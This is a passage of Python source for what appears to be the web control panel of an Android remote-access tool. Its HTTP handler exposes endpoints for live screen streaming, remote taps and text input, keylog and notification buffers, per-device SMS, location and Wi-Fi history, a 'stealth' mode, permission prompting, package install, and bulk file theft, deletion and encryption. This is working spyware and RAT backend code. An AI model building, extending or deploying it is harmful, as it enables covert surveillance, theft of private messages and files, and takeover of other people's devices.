            try: jpeg = base64.b64decode(b64)
            except Exception:
                await asyncio.sleep(frame_delay); continue
            try:
                header = (b"--frame\r\nContent-Type: image/jpeg\r\n"
                          b"Content-Length: " + str(len(jpeg)).encode() + b"\r\n\r\n")
                writer.write(header); writer.write(jpeg); writer.write(b"\r\n")
                await writer.drain()
            except _ABORT_EXCS: break
            except asyncio.CancelledError: raise
            except Exception: break
            wait = frame_delay - (time.time() - t0)
            if wait > 0: await asyncio.sleep(wait)
    except asyncio.CancelledError: raise
    except _ABORT_EXCS: pass
    finally:
        print(f"{C.GRAY} ○ live camera STOP client={client_id}{C.RESET}")
        try: writer.close()
        except Exception: pass


def _downscale_jpeg(jpeg_bytes, max_width, quality):
    if not _PIL_OK: return jpeg_bytes
    try:
        im = Image.open(_pil_io.BytesIO(jpeg_bytes))
        w, h = im.size
        if w > max_width:
            ratio = max_width / float(w)
            im = im.resize((max_width, int(h * ratio)), Image.BILINEAR)
        out = _pil_io.BytesIO()
        im.convert("RGB").save(out, "JPEG", quality=quality, optimize=False)
        return out.getvalue()
    except Exception: return jpeg_bytes


async def screen_mjpeg_loop(writer, client_id, fps=3.0, max_width=720, quality=55):
    import hashlib as _hashlib
    print(f"{C.CYAN} ● live SCREEN start client={client_id} fps={fps} w≤{max_width}{C.RESET}")
    try:
        writer.write((
            "HTTP/1.1 200 OK\r\n"
            "Content-Type: multipart/x-mixed-replace; boundary=frame\r\n"
            "Cache-Control: no-cache, no-store, must-revalidate\r\n"
            "Pragma: no-cache\r\n"
            "Access-Control-Allow-Origin: *\r\n"
            "Connection: close\r\n\r\n").encode("latin-1"))
        await writer.drain()
    except Exception: return

    frame_delay = 1.0 / max(0.5, min(fps, 10.0))
    last_hash = b""; last_err = ""; err_count = 0; first_ok = True

    try:
        while True:
            t0 = time.time()
            if client_id not in clients: break
            try:
                r = await send("screenshot", ["_screen_live.jpg"],
                               to=client_id, timeout=6)
            except Exception as e: r = {"error": str(e)}
            if "error" in r:
                err_count += 1
                msg = r.get("error", "?")
                if msg != last_err:
                    print(f"{C.YELLOW} screen live err: {msg}{C.RESET}"); last_err = msg
                if err_count > 8: break
                await asyncio.sleep(0.8); continue
            err_count = 0
            if r.get("file"):
                try: jpeg = base64.b64decode(r["file"])
                except Exception:
                    await asyncio.sleep(frame_delay); continue
            elif r.get("saved_name"):
                try:
                    p = os.path.join(SAVE_DIR, r["saved_name"])
                    with open(p, "rb") as f: jpeg = f.read()
                except Exception:
                    await asyncio.sleep(frame_delay); continue
            else:
                await asyncio.sleep(frame_delay); continue

            jpeg = _downscale_jpeg(jpeg, max_width, quality)
            h = _hashlib.md5(jpeg).digest()
            if h == last_hash and not first_ok:
                wait = frame_delay - (time.time() - t0)
                if wait > 0: await asyncio.sleep(wait)
                continue
            last_hash = h; first_ok = False

            try:
                header = (b"--frame\r\nContent-Type: image/jpeg\r\n"
                          b"Content-Length: " + str(len(jpeg)).encode() + b"\r\n\r\n")
                writer.write(header); writer.write(jpeg); writer.write(b"\r\n")
                await writer.drain()
            except _ABORT_EXCS: break
            except asyncio.CancelledError: raise
            except Exception: break

            wait = frame_delay - (time.time() - t0)
            if wait > 0: await asyncio.sleep(wait)
    except asyncio.CancelledError: raise
    except _ABORT_EXCS: pass
    finally:
        print(f"{C.GRAY} ○ live SCREEN stop client={client_id}{C.RESET}")
        try: writer.close()
        except Exception: pass


# ══════════════════════════════════════════════════════════════════════
#   HTTP HANDLER
# ══════════════════════════════════════════════════════════════════════
async def handle_http(reader, writer):
    global active, remote_cwd, session_recording
    try:
        req = await read_http(reader)
        if not req:
            writer.close(); return
        method, path, headers, body = req
        parsed = urlparse(path)
        route = parsed.path

        if method == "OPTIONS":
            await http_reply(writer, 200, "text/plain", "", {
                "Access-Control-Allow-Methods": "GET,POST,OPTIONS",
                "Access-Control-Allow-Headers": "Content-Type"})
            writer.close(); return

        if method == "GET" and route in ("/login", "/login.html"):
            await http_reply(writer, 200, "text/html; charset=utf-8", LOGIN_PAGE)
            writer.close(); return

        if method == "POST" and route == "/api/login":
            try: data = json.loads(body.decode())
            except Exception:
                await http_json(writer, {"error": "bad json"}, 400); writer.close(); return
            pw = data.get("password", "")
            if _verify_pw(pw, CONFIG["pw_salt"], CONFIG["pw_hash"]):
                tok = new_session()
                cookie = f"trm_sess={tok}; Path=/; HttpOnly; SameSite=Lax; Max-Age={WEB_SESSION_TTL}"
                await http_reply(writer, 200, "application/json",
                    json.dumps({"ok": True}), {"Set-Cookie": cookie})
            else:
                await http_json(writer, {"error": "invalid password"}, 401)
            writer.close(); return

        if method == "POST" and route == "/api/logout":
            tok = get_cookie(headers, "trm_sess")
            if tok: revoke_session(tok)
            await http_reply(writer, 200, "application/json",
                json.dumps({"ok": True}),
                {"Set-Cookie": "trm_sess=; Path=/; Max-Age=0"})
            writer.close(); return

        tok = get_cookie(headers, "trm_sess")
        if not check_session(tok):
            if method == "GET" and route in ("/", "/index.html"):
                await http_reply(writer, 302, "text/plain", "", {"Location": "/login"})
                writer.close(); return
            if method == "GET" and route.startswith("/api/events"):
                await http_reply(writer, 401, "text/plain", "unauthorized")
                writer.close(); return
            if route.startswith("/api/"):
                await http_json(writer, {"error": "unauthorized", "login": True}, 401)
                writer.close(); return
            if method == "GET" and route == "/login": pass
            else:
                await http_reply(writer, 302, "text/plain", "", {"Location": "/login"})
                writer.close(); return

        if method == "POST" and route == "/api/change-password":
            try: data = json.loads(body.decode())
            except Exception:
                await http_json(writer, {"error": "bad json"}, 400); writer.close(); return
            old_pw = data.get("old", ""); new_pw = data.get("new", "")
            if not _verify_pw(old_pw, CONFIG["pw_salt"], CONFIG["pw_hash"]):
                await http_json(writer, {"error": "current password wrong"}, 401)
                writer.close(); return
            if len(new_pw) < 4:
                await http_json(writer, {"error": "new password too short (min 4)"}, 400)
                writer.close(); return
            salt, h = _hash_pw(new_pw)
            CONFIG["pw_salt"] = salt; CONFIG["pw_hash"] = h
            save_config(CONFIG); _sessions.clear()
            await http_json(writer, {"ok": True, "msg": "password changed — please login again"})
            writer.close(); return

        if method == "GET" and route == "/api/whoami":
            await http_json(writer, {"ok": True}); writer.close(); return

        if method == "GET" and route in ("/", "/index.html"):
            await http_reply(writer, 200, "text/html; charset=utf-8", HTML_PAGE)
            writer.close(); return

        if method == "GET" and route == "/api/capabilities":
            await http_json(writer, {
                "pil": _PIL_OK, "max_fps": 10, "screen_mjpeg": True,
                "screen_live_fps_default": 3,
                "screen_live_width_default": 720,
                "screen_live_quality_default": 55,
                "features": [
                    "hash", "chunked-upload", "mounts", "mount", "du_tree",
                    "reboot", "install", "screen_on_off", "screenrec_av",
                    "usage_stats", "wifi_history", "stealth",
                    "projection_state",
                ]})
            writer.close(); return

        if method == "GET" and route == "/api/state":
            await http_json(writer, {"active": active, "cwd": remote_cwd,
                "clients": clients_snapshot(),
                "projection": projection_state.get(active, {}) if active else {},
                "keylog": keylog_buffer[-KEYLOG_KEEP:],
                "notif": notif_buffer[-NOTIF_KEEP:]})
            writer.close(); return

        # ★★ PROJECTION ENDPOINTS
        if method == "GET" and route == "/api/projection/state":
            cid = active
            st = projection_state.get(cid, {}) if cid else {}
            await http_json(writer, {
                "client": cid,
                "screen": st.get("screen"),
                "msg": st.get("msg", ""),
                "reason": st.get("reason", ""),
                "denied": st.get("denied", False),
                "ts": st.get("ts", 0)})
            writer.close(); return

        if method == "POST" and route == "/api/projection/request":
            if not active:
                await http_json(writer, {"error": "no client"}); writer.close(); return
            try:
                # First check if already granted
                sr = await send("statusperm", [], timeout=20)
                granted = False
                try:
                    if sr and sr.get("output"):
                        o = json.loads(sr["output"])
                        granted = bool(o.get("screenCapture"))
                except Exception: pass
                if granted:
                    # Sync local state
                    _record_projection_state(active, {"screen": True, "msg": "already granted"})
                    await http_json(writer, {
                        "ok": True, "already_granted": True,
                        "output": "screen capture ALREADY granted ✓"})
                    writer.close(); return
                r = await send("reqscreen", timeout=30)
                await http_json(writer, r)
            except Exception as e:
                await http_json(writer, {"error": str(e)})
            writer.close(); return

        # ═══ SESSION RECORDING ═══
        if method == "GET" and route == "/api/session/status":
            await http_json(writer, {
                "recording": session_recording,
                "count": len(session_events)})
            writer.close(); return

        if method == "POST" and route == "/api/session/record":
            try: data = json.loads(body.decode())
            except Exception: data = {}
            on = bool(data.get("on", False))
            clear_first = bool(data.get("clear", False))
            if clear_first and on: session_events.clear()
            session_recording = on
            await sse_broadcast("session_recording", {"recording": session_recording})
            await http_json(writer, {"ok": True, "recording": session_recording,
                                     "count": len(session_events)})
            writer.close(); return

        if method == "GET" and route == "/api/session/events":
            qs = parse_qs(parsed.query)
            try: since = float(qs.get("since", ["0"])[0] or 0)
            except Exception: since = 0.0
            out = [e for e in session_events if e["ts"] >= since]
            await http_json(writer, {"events": out,
                "recording": session_recording,
                "total": len(session_events)})
            writer.close(); return

        if method == "POST" and route == "/api/session/clear":
            session_events.clear()
            await sse_broadcast("session_cleared", {})
            await http_json(writer, {"ok": True}); writer.close(); return

        if method == "GET" and route == "/api/session/export":
            exp = json.dumps({
                "exported_at": time.time(),
                "exported_at_human": time.strftime("%Y-%m-%d %H:%M:%S"),
                "count": len(session_events),
                "events": session_events}, indent=2).encode()
            stamp = time.strftime("%Y%m%d_%H%M%S")
            await http_reply(writer, 200, "application/json", exp, {
                "Content-Disposition": f'attachment; filename="session_{stamp}.json"'})
            writer.close(); return

        # ═══ CLIENT SUMMARY ═══
        if method == "GET" and route == "/api/clients/summary":
            now = time.time(); out = []
            for cid, i in clients.items():
                meta = clients_meta.get(cid, {})
                proj = projection_state.get(cid, {})
                entry = {
                    "id": cid, "model": i.get("model", "?"),
                    "android": i.get("android", "?"),
                    "build": i.get("build", "?"),
                    "secs": int(now - i["connected"]),
                    "active": cid == active,
                    "last_hb": i.get("last_hb", 0),
                    "notes": meta.get("notes", ""),
                    "tags": meta.get("tags", []),
                    "display_name": meta.get("display_name", ""),
                    "reconnect_count": reconnect_counts.get(cid, 0),
                    "battery": None, "last_sms": None,
                    "last_notif": None, "last_location": None,
                    "last_app_launched": None, "last_wifi": None,
                    "screen": proj.get("screen"),
                }
                net = client_net.get(cid)
                if net:
                    entry["ip"] = net.get("ip", ""); entry["port"] = net.get("port", "")
                wh = wifi_history_cache.get(cid, [])
                if wh: entry["last_wifi"] = wh[-1]
                for e in reversed(session_events):
                    if e.get("client") != cid: continue
                    t = e.get("type"); d = e.get("data") or {}
                    if t == "battery" and entry["battery"] is None:
                        try: entry["battery"] = int(d.get("level"))
                        except Exception: pass
                    elif t == "sms" and entry["last_sms"] is None:
                        entry["last_sms"] = {"from": d.get("from", "?"),
                            "body": (d.get("body") or "")[:80], "ts": e["ts"]}
                    elif t == "notification" and entry["last_notif"] is None:
                        try:
                            nd = json.loads(d.get("data", "{}")) if isinstance(d.get("data"), str) else d.get("data", {})
                            entry["last_notif"] = {"app": nd.get("app", "?"),
                                "title": (nd.get("title") or "")[:60],
                                "body": (nd.get("body") or "")[:80], "ts": e["ts"]}
                        except Exception:
                            entry["last_notif"] = {"app": "?", "title": "", "body": "", "ts": e["ts"]}
                    elif t == "location" and entry["last_location"] is None:
                        entry["last_location"] = {"lat": d.get("lat"), "lon": d.get("lon"),
                            "acc": d.get("acc"), "ts": e["ts"]}
                    elif t == "app_launched" and entry["last_app_launched"] is None:
                        entry["last_app_launched"] = {"pkg": d.get("pkg", "?"), "ts": e["ts"]}
                out.append(entry)
            await http_json(writer, {"clients": out}); writer.close(); return

        # ═══ NOTES & TAGS ═══
        if method == "GET" and route == "/api/client/meta":
            cid = parse_qs(parsed.query).get("id", [""])[0]
            if not cid:
                await http_json(writer, {"error": "id required"}); writer.close(); return
            await http_json(writer, {"id": cid, "meta": clients_meta.get(cid, {})})
            writer.close(); return

        if method == "POST" and route == "/api/client/meta":
            try: data = json.loads(body.decode())
            except Exception:
                await http_json(writer, {"error": "bad json"}, 400); writer.close(); return
            cid = (data.get("id") or "").strip()
            if not cid:
                await http_json(writer, {"error": "id required"}); writer.close(); return
            meta = dict(clients_meta.get(cid, {}))
            if "notes" in data: meta["notes"] = str(data["notes"])[:2000]
            if "display_name" in data: meta["display_name"] = str(data["display_name"])[:64]
            if "tags" in data and isinstance(data["tags"], list):
                meta["tags"] = [str(t)[:32].strip() for t in data["tags"][:20] if str(t).strip()]
            clients_meta[cid] = meta
            _save_clients_meta()
            await sse_broadcast("clients", {"clients": clients_snapshot(), "active": active})
            await http_json(writer, {"ok": True, "meta": meta})
            writer.close(); return

        # ═══ BULK FILES ═══
        if method == "POST" and route == "/api/file/bulk":
            try: data = json.loads(body.decode())
            except Exception:
                await http_json(writer, {"error": "bad json"}, 400); writer.close(); return
            op = (data.get("op") or "").lower()
            paths = data.get("paths") or []
            pw = (data.get("password") or "").strip()
            if not isinstance(paths, list) or not paths:
                await http_json(writer, {"error": "paths required"}); writer.close(); return
            if len(paths) > 500:
                await http_json(writer, {"error": "too many paths (max 500)"}); writer.close(); return
            results = []
            for p in paths:
                p = str(p)
                if op == "delete": r = await send("rm", [p])
                elif op in ("encrypt", "decrypt", "zipenc", "unzipdec"):
                    args = [p] + ([pw] if pw else [])
                    r = await send(op, args)
                else:
                    results.append({"path": p, "error": f"unknown op '{op}'"}); continue
                ok = "error" not in r
                results.append({"path": p, "ok": ok,
                    "out": r.get("output") or r.get("error") or ""})
            ok_n = sum(1 for x in results if x.get("ok"))
            await http_json(writer, {"ok": True, "op": op,
                "total": len(results), "success": ok_n, "results": results})
            writer.close(); return

        if method == "POST" and route == "/api/file/download-zip":
            try: data = json.loads(body.decode())
            except Exception:
                await http_json(writer, {"error": "bad json"}, 400); writer.close(); return
            paths = data.get("paths") or []
            if not isinstance(paths, list) or not paths:
                await http_json(writer, {"error": "paths required"}); writer.close(); return
            if len(paths) > 200:
                await http_json(writer, {"error": "too many paths (max 200)"}); writer.close(); return
            import io as _io, zipfile as _zipfile
            buf = _io.BytesIO(); added = 0; errors = []
            with _zipfile.ZipFile(buf, "w", _zipfile.ZIP_DEFLATED) as zf:
                for p in paths:
                    p = str(p)
                    r = await send("get", [p])
                    if "error" in r:
                        errors.append({"path": p, "err": r["error"]}); continue
                    b64 = r.get("file", "")
                    if not b64:
                        errors.append({"path": p, "err": r.get("note") or "no data"}); continue
                    try: raw = base64.b64decode(b64)
                    except Exception as e:
                        errors.append({"path": p, "err": str(e)}); continue
                    arcname = os.path.basename(p) or f"file_{added}"
                    zf.writestr(arcname, raw); added += 1
            if added == 0:
                await http_json(writer, {"error": "no files retrieved", "details": errors})
                writer.close(); return
            blob = buf.getvalue()
            stamp = time.strftime("%Y%m%d_%H%M%S")
            fname = f"termuxremote_bundle_{stamp}.zip"
            await http_reply(writer, 200, "application/zip", blob, {
                "Content-Disposition": f'attachment; filename="{fname}"',
                "Cache-Control": "no-cache"})
            writer.close(); return

        if method == "POST" and route == "/api/file/upload-multi":
            ctype = headers.get("content-type", "")
            if "boundary=" not in ctype:
                await http_json(writer, {"error": "expect multipart"}); writer.close(); return
            boundary = ctype.split("boundary=", 1)[1].strip().strip('"')
            parts = parse_multipart_multi(body, boundary)
            files = parts.get("files", [])
            if not files:
                await http_json(writer, {"error": "no files"}); writer.close(); return
            results = []
            for fname, raw in files:
                if len(raw) > MAX_FILE:
                    results.append({"name": fname, "error": "too large"}); continue
                try:
                    b64 = base64.b64encode(raw).decode()
                    r = await send("put", [fname, b64])
                    results.append({"name": fname, "ok": "error" not in r,
                        "out": r.get("output") or r.get("error") or ""})
                except Exception as e:
                    results.append({"name": fname, "error": str(e)})
            ok_n = sum(1 for x in results if x.get("ok"))
            await http_json(writer, {"ok": True, "total": len(results),
                "success": ok_n, "results": results})
            writer.close(); return

        # ═══ CHUNKED UPLOAD ═══
        if method == "POST" and route == "/api/file/upload-chunk/start":
            try: data = json.loads(body.decode())
            except Exception:
                await http_json(writer, {"error": "bad json"}, 400); writer.close(); return
            remote = (data.get("path") or "").strip()
            total = int(data.get("size") or 0)
            chunk_size = int(data.get("chunk_size") or (256 * 1024))
            if not remote:
                await http_json(writer, {"error": "path required"}); writer.close(); return
            upload_id = secrets.token_urlsafe(16)
            chunk_uploads[upload_id] = {
                "path": remote, "size": total, "received": 0,
                "chunk_size": chunk_size, "created": time.time()}
            await http_json(writer, {"ok": True, "upload_id": upload_id,
                                     "chunk_size": chunk_size})
            writer.close(); return

        if method == "POST" and route == "/api/file/upload-chunk/blob":
            ctype = headers.get("content-type", "")
            if "boundary=" not in ctype:
                await http_json(writer, {"error": "expect multipart"}); writer.close(); return
            boundary = ctype.split("boundary=", 1)[1].strip().strip('"')
            parts = parse_multipart(body, boundary)
            if "file" not in parts or "upload_id" not in parts:
                await http_json(writer, {"error": "file + upload_id required"}); writer.close(); return
            upload_id = parts["upload_id"].decode("utf-8", errors="replace").strip()
            chunk = parts["file"]
            info = chunk_uploads.get(upload_id)
            if not info:
                await http_json(writer, {"error": "unknown upload_id"}); writer.close(); return
            if len(chunk) > 8 * 1024 * 1024:
                await http_json(writer, {"error": "chunk too large"}); writer.close(); return
            b64 = base64.b64encode(chunk).decode()
            offset = info["received"]
            r = await send("put_chunk", [info["path"], str(offset), b64])
            if "error" in r:
                await http_json(writer, {"error": r["error"]}); writer.close(); return
            info["received"] += len(chunk)
            done = info["size"] > 0 and info["received"] >= info["size"]
            if done: chunk_uploads.pop(upload_id, None)
            await http_json(writer, {"ok": True, "received": info["received"],
                "total": info["size"], "done": done})
            writer.close(); return

        if method == "POST" and route == "/api/file/upload-chunk/cancel":
            try: data = json.loads(body.decode())
            except Exception: data = {}
            upload_id = (data.get("upload_id") or "").strip()
            chunk_uploads.pop(upload_id, None)
            await http_json(writer, {"ok": True}); writer.close(); return

        # ═══ HASH ═══
        if method == "POST" and route == "/api/hash":
            try: data = json.loads(body.decode())
            except Exception:
                await http_json(writer, {"error": "bad json"}, 400); writer.close(); return
            algo = (data.get("algo") or "sha256").strip()
            path = (data.get("path") or "").strip()
            if not path:
                await http_json(writer, {"error": "path required"}); writer.close(); return
            r = await send("hash", [algo, path])
            await http_json(writer, r); writer.close(); return

        # ═══ MOUNTS / DU TREE ═══
        if method == "GET" and route == "/api/mounts":
            r = await send("mounts")
            await http_json(writer, r); writer.close(); return

        if method == "POST" and route == "/api/mount":
            try: data = json.loads(body.decode())
            except Exception:
                await http_json(writer, {"error": "bad json"}, 400); writer.close(); return
            dev = (data.get("device") or "").strip()
            mnt = (data.get("path") or "").strip()
            if not dev or not mnt:
                await http_json(writer, {"error": "device and path required"}); writer.close(); return
            r = await send("mount", [dev, mnt])
            await http_json(writer, r); writer.close(); return

        if method == "GET" and route == "/api/du/tree":
            qs = parse_qs(parsed.query)
            path = qs.get("path", [""])[0]
            args = [path] if path else []
            r = await send("du_tree", args)
            await http_json(writer, r); writer.close(); return

        # ═══ REBOOT / INSTALL ═══
        if method == "POST" and route == "/api/reboot":
            try: data = json.loads(body.decode())
            except Exception: data = {}
            mode = (data.get("mode") or "normal").lower()
            if mode not in ("normal", "recovery", "bootloader"):
                await http_json(writer, {"error": "invalid mode"}); writer.close(); return
            r = await send("reboot", [mode])
            await http_json(writer, r); writer.close(); return

        if method == "POST" and route == "/api/install":
            try: data = json.loads(body.decode())
            except Exception:
                await http_json(writer, {"error": "bad json"}, 400); writer.close(); return
            path = (data.get("path") or "").strip()
            if not path:
                await http_json(writer, {"error": "path required"}); writer.close(); return
            r = await send("install", [path])
            await http_json(writer, r); writer.close(); return

        # ═══ STEALTH ═══
        if method == "GET" and route == "/api/stealth":
            r = await send("stealth", ["status"])
            await http_json(writer, r); writer.close(); return

        if method == "POST" and route == "/api/stealth":
            try: data = json.loads(body.decode())
            except Exception:
                await http_json(writer, {"error": "bad json"}, 400); writer.close(); return
            what = (data.get("action") or "status").lower()
            if what not in ("on", "off", "status", "show"):
                await http_json(writer, {"error": "action must be on|off|status|show"})
                writer.close(); return
            r = await send("stealth", [what])
            await http_json(writer, r); writer.close(); return

        # ═══ WIFI HISTORY ═══
        if method == "GET" and route == "/api/wifi/history":
            qs = parse_qs(parsed.query)
            limit = 100
            try: limit = int(qs.get("limit", ["100"])[0])
            except Exception: pass
            cid = active
            arr = wifi_history_cache.get(cid, [])
            await http_json(writer, {"client": cid, "count": len(arr),
                                     "entries": arr[-limit:]})
            writer.close(); return

        if method == "POST" and route == "/api/wifi/clear":
            if active: wifi_history_cache.pop(active, None)
            try: await send("wifi_clear", [])
            except Exception: pass
            await http_json(writer, {"ok": True}); writer.close(); return

        if method == "POST" and route == "/api/wifi/current":
            r = await send("wifi_current")
            await http_json(writer, r); writer.close(); return

        if method == "POST" and route == "/api/wifi/pull-device":
            try: limit = int((json.loads(body.decode() or "{}") if body else {}).get("limit") or 200)
            except Exception: limit = 200
            r = await send("wifi_history", [str(limit)])
            await http_json(writer, r); writer.close(); return

        # ═══ USAGE STATS ═══
        if method == "GET" and route == "/api/usage/stats":
            qs = parse_qs(parsed.query)
            try: hours = int(qs.get("hours", ["24"])[0])
            except Exception: hours = 24
            try: limit = int(qs.get("limit", ["50"])[0])
            except Exception: limit = 50
            r = await send("usage_stats", [str(hours), str(limit)])
            await http_json(writer, r); writer.close(); return

        if method == "POST" and route == "/api/usage/perm":
            r = await send("usage_perm", [])
            await http_json(writer, r); writer.close(); return

        # ═══ SCREEN CONTROL ═══
        if method == "POST" and route == "/api/screen/tap":
            try: data = json.loads(body.decode())
            except Exception:
                await http_json(writer, {"error": "bad json"}, 400); writer.close(); return
            r = await send("tap", [str(data.get("x", 0)), str(data.get("y", 0))])
            await http_json(writer, r); writer.close(); return

        if method == "POST" and route == "/api/screen/swipe":
            try: data = json.loads(body.decode())
            except Exception:
                await http_json(writer, {"error": "bad json"}, 400); writer.close(); return
            args = [str(data.get("x1", 0)), str(data.get("y1", 0)),
                    str(data.get("x2", 0)), str(data.get("y2", 0)),
                    str(data.get("ms", 300))]
            r = await send("swipe", args)
            await http_json(writer, r); writer.close(); return

        if method == "POST" and route == "/api/screen/longpress":
            try: data = json.loads(body.decode())
            except Exception:
                await http_json(writer, {"error": "bad json"}, 400); writer.close(); return
            r = await send("longpress", [str(data.get("x", 0)), str(data.get("y", 0))])
            await http_json(writer, r); writer.close(); return

        if method == "POST" and route == "/api/screen/key":
            try: data = json.loads(body.decode())
            except Exception:
                await http_json(writer, {"error": "bad json"}, 400); writer.close(); return
            r = await send("key", [str(data.get("code", 0))])
            await http_json(writer, r); writer.close(); return

        if method == "POST" and route == "/api/screen/text":
            try: data = json.loads(body.decode())
            except Exception:
                await http_json(writer, {"error": "bad json"}, 400); writer.close(); return
            txt = (data.get("text") or "").strip()
            if not txt:
                await http_json(writer, {"error": "text required"}); writer.close(); return
            r = await send("text", [txt])
            await http_json(writer, r); writer.close(); return

        if method == "POST" and route == "/api/screen/appendtext":
            try: data = json.loads(body.decode())
            except Exception:
                await http_json(writer, {"error": "bad json"}, 400); writer.close(); return
            txt = (data.get("text") or "")
            if not txt:
                await http_json(writer, {"error": "text required"}); writer.close(); return
            r = await send("appendtext", [txt])
            await http_json(writer, r); writer.close(); return

        if method == "POST" and route == "/api/screen/action":
            try: data = json.loads(body.decode())
            except Exception:
                await http_json(writer, {"error": "bad json"}, 400); writer.close(); return
            what = (data.get("what") or "").lower()
            allowed = {"back": "back", "home": "home", "recents": "recents",
                       "power": "power", "lock": "lock",
                       "volume_up": "volume_up", "volume_down": "volume_down",
                       "notifications": "notification_shade",
                       "quick_settings": "quick_settings"}
            if what not in allowed:
                await http_json(writer, {
                    "error": "what must be one of: " + ",".join(allowed.keys())})
                writer.close(); return
            r = await send(allowed[what], [])
            await http_json(writer, r); writer.close(); return

        if method == "GET" and route == "/api/screen/size":
            r = await send("screen_size")
            await http_json(writer, r); writer.close(); return

        if method == "POST" and route == "/api/screen/off":
            r = await send("screen", ["off"])
            await http_json(writer, r); writer.close(); return

        if method == "POST" and route == "/api/screen/on":
            r = await send("screen", ["on"])
            await http_json(writer, r); writer.close(); return

        if method == "POST" and route == "/api/screenrec/av":
            try: data = json.loads(body.decode())
            except Exception:
                await http_json(writer, {"error": "bad json"}, 400); writer.close(); return
            secs = int(data.get("secs", 5))
            name = (data.get("name") or "").strip()
            if secs < 1 or secs > 300:
                await http_json(writer, {"error": "secs 1..300"}); writer.close(); return
            args = [str(secs)]
            if name: args.append(name)
            r = await send("screenrec_av", args)
            r = process_media_response(r)
            await http_json(writer, r); writer.close(); return

        if method == "GET" and route == "/api/screen/live":
            if not active:
                await http_reply(writer, 503, "text/plain", "no client")
                writer.close(); return
            qs = parse_qs(parsed.query)
            try: fps = float(qs.get("fps", ["3"])[0])
            except Exception: fps = 3.0
            try: mw = int(qs.get("w", ["720"])[0])
            except Exception: mw = 720
            try: q = int(qs.get("q", ["55"])[0])
            except Exception: q = 55
            fps = max(0.5, min(fps, 10.0))
            mw = max(240, min(mw, 1920))
            q = max(20, min(q, 90))
            await screen_mjpeg_loop(writer, active, fps=fps, max_width=mw, quality=q)
            return

        # ═══ NETWORK / PERMS ═══
        if method == "POST" and route == "/api/setnet":
            try: data = json.loads(body.decode())
            except Exception:
                await http_json(writer, {"error": "bad json"}, 400); writer.close(); return
            ip = (data.get("ip") or "").strip()
            port = str(data.get("port") or "").strip()
            tokv = (data.get("token") or "").strip()
            if not ip or not port:
                await http_json(writer, {"error": "ip and port required"}); writer.close(); return
            try:
                pi = int(port)
                if pi < 1 or pi > 65535: raise ValueError()
            except Exception:
                await http_json(writer, {"error": "invalid port"}); writer.close(); return
            args = [ip, port]
            if tokv: args.append(tokv)
            r = await send("setnet", args)
            if active and "error" not in r:
                client_net[active] = {"ip": ip, "port": port,
                                      "connected": True, "clientId": active}
                await sse_broadcast("clients",
                    {"clients": clients_snapshot(), "active": active})
            await http_json(writer, r); writer.close(); return

        if method == "GET" and route == "/api/getnet":
            r = await send("getnet")
            try:
                if active and "output" in r:
                    o = json.loads(r["output"])
                    client_net[active] = {
                        "ip": o.get("ip", ""), "port": o.get("port", ""),
                        "connected": bool(o.get("connected", False)),
                        "clientId": o.get("clientId", active)}
                    await sse_broadcast("clients",
                        {"clients": clients_snapshot(), "active": active})
            except Exception: pass
            await http_json(writer, r); writer.close(); return

        if method == "POST" and route == "/api/reqscreen":
            r = await send("reqscreen", timeout=30)
            await http_json(writer, r); writer.close(); return

        if method == "POST" and route == "/api/reqoverlay":
            r = await send("reqoverlay")
            await http_json(writer, r); writer.close(); return

        if method == "GET" and route == "/api/statusperm":
            r = await send("statusperm")
            try:
                if active and r.get("output"):
                    o = json.loads(r["output"])
                    _record_projection_state(active, {
                        "screen": bool(o.get("screenCapture")),
                        "overlay": bool(o.get("overlay")),
                    })
            except Exception: pass
            await http_json(writer, r); writer.close(); return

        if method == "POST" and route == "/api/askperm":
            try: data = json.loads(body.decode())
            except Exception:
                await http_json(writer, {"error": "bad json"}, 400); writer.close(); return
            what = (data.get("what") or "all").strip()
            r = await send("askperm", [what])
            await http_json(writer, r); writer.close(); return

        # ═══ APPS ═══
        if method == "GET" and route == "/api/apps":
            if not active:
                await http_json(writer, {"error": "no client selected"})
                writer.close(); return
            force = parse_qs(parsed.query).get("force", ["0"])[0] == "1"
            cached = app_cache.get(active)
            if not force and cached and (time.time() - cached["ts"]) < 300:
                await http_json(writer, {"apps": cached["apps"],
                    "count": len(cached["apps"]), "cached": True})
                writer.close(); return
            r = await send("applist")
            if "error" in r:
                await http_json(writer, r); writer.close(); return
            try: apps = json.loads(r.get("output", "[]"))
            except Exception: apps = []
            app_cache[active] = {"apps": apps, "ts": time.time()}
            await http_json(writer, {"apps": apps, "count": len(apps), "cached": False})
            writer.close(); return

        if method == "POST" and route == "/api/app/open":
            try: data = json.loads(body.decode())
            except Exception:
                await http_json(writer, {"error": "bad json"}, 400); writer.close(); return
            pkg = (data.get("pkg") or "").strip()
            act = (data.get("activity") or "").strip()
            if not pkg:
                await http_json(writer, {"error": "pkg required"}); writer.close(); return
            args = [pkg]
            if act: args.append(act)
            r = await send("appopen", args)
            await http_json(writer, r); writer.close(); return

        if method == "POST" and route == "/api/app/info":
            try: data = json.loads(body.decode())
            except Exception:
                await http_json(writer, {"error": "bad json"}, 400); writer.close(); return
            pkg = (data.get("pkg") or "").strip()
            if not pkg:
                await http_json(writer, {"error": "pkg required"}); writer.close(); return
            r = await send("appinfo", [pkg])
            await http_json(writer, r); writer.close(); return

        # ═══ FILE CRYPTO ═══
        if method == "POST" and route == "/api/file/encrypt":
            try: data = json.loads(body.decode())
            except Exception:
                await http_json(writer, {"error": "bad json"}, 400); writer.close(); return
            name = (data.get("name") or "").strip()
            pw = (data.get("password") or "").strip()
            if not name:
                await http_json(writer, {"error": "name required"}); writer.close(); return
            args = [name]
            if pw: args.append(pw)
            r = await send("encrypt", args)
            await http_json(writer, r); writer.close(); return

        if method == "POST" and route == "/api/file/decrypt":
            try: data = json.loads(body.decode())
            except Exception:
                await http_json(writer, {"error": "bad json"}, 400); writer.close(); return
            name = (data.get("name") or "").strip()
            pw = (data.get("password") or "").strip()
            if not name:
                await http_json(writer, {"error": "name required"}); writer.close(); return
            args = [name]
            if pw: args.append(pw)
            r = await send("decrypt", args)
            await http_json(writer, r); writer.close(); return

        if method == "POST" and route == "/api/file/zipenc":
            try: data = json.loads(body.decode())
            except Exception:
                await http_json(writer, {"error": "bad json"}, 400); writer.close(); return
            name = (data.get("name") or "").strip()
            pw = (data.get("password") or "").strip()
            if not name:
                await http_json(writer, {"error": "name required"}); writer.close(); return
            args = [name]
            if pw: args.append(pw)
            r = await send("zipenc", args)
            await http_json(writer, r); writer.close(); return

        if method == "POST" and route == "/api/file/unzipdec":
            try: data = json.loads(body.decode())
            except Exception:
                await http_json(writer, {"error": "bad json"}, 400); writer.close(); return
